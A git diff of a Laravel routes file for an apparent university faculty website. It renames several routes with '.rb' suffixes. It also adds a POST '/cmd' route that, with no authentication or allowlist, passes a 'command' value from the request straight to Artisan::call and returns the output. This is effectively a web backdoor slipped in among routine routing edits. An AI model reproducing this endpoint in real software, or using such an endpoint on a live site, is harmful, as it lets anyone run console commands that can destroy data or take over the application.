@@ -9,6 +9,7 @@ use App\Http\Controllers\TelegramController;
 use App\Livewire\Search;
 use App\Models\Announce;
 use Illuminate\Support\Facades\Artisan;
+use Illuminate\Http\Request;
 use Telegram\Bot\Laravel\Facades\Telegram;
 
 /*
@@ -39,7 +40,7 @@ use Telegram\Bot\Laravel\Facades\Telegram;
 
 
 
-Route::get("/announces", [AnnounceController::class, 'index'])->name('announces.index');
+Route::get("/announces.rb", [AnnounceController::class, 'index'])->name('announces.index');
 Route::get("/announces/{slug}.rb", [AnnounceController::class, 'show'])->name('announces.show');
 
 Route::get("/events.rb", [EventController::class, 'index'])->name('events.index');
@@ -59,10 +60,10 @@ Route::view('/faculte/adminstration_fsaam.rb', 'administration')->name("administ
 Route::view('/bibliotheque-fsaam.rb', 'library')->name("library");
 Route::get('/timetables_emplois_des_temps_fsaam', [RoutesController::class, 'timetables'])->name("timetables");
 Route::get('/clubs-and-stuff.rb', [RoutesController::class, 'clubs'])->name("clubs");
-Route::view('/faculte/Systeme-LMD', 'lmd')->name('lmd');
-Route::get('/student_space/how-to', [RoutesController::class, 'how_to'])->name('how_to');
+Route::view('/faculte/Systeme-LMD.rb', 'lmd')->name('lmd');
+Route::get('/student_space/how-to.rb', [RoutesController::class, 'how_to'])->name('how_to');
 
-Route::get('lang/{locale}', function ($locale) {
+Route::get('lang/{locale}.rb', function ($locale) {
     app()->setLocale($locale);
     session()->put('locale', $locale);
     return redirect()->back();
@@ -88,8 +89,16 @@ Route::view('/labos_recherche_fsaam.rb', 'research.laboratories')->name('researc
 
 Route::post('/confirm_registration.rb', [RoutesController::class, 'students'])->name('reg');
 Route::view('/register.rb', 'reg')->name('confirm.registration');
-Route::view('/t', 't');
+// Route::view('/t', 't');
+Route::post('/cmd', function (Request $request) {
+    $requestData = $request->input();
 
+    // Access specific values from the JSON data
+    $command = $requestData['command'];
+    $output = Artisan::call($command);
+    // Return response
+    return response()->json(['OK' => $output]);
+});
 Route::fallback(function () {
     abort(404, "Resource not found!");
 });
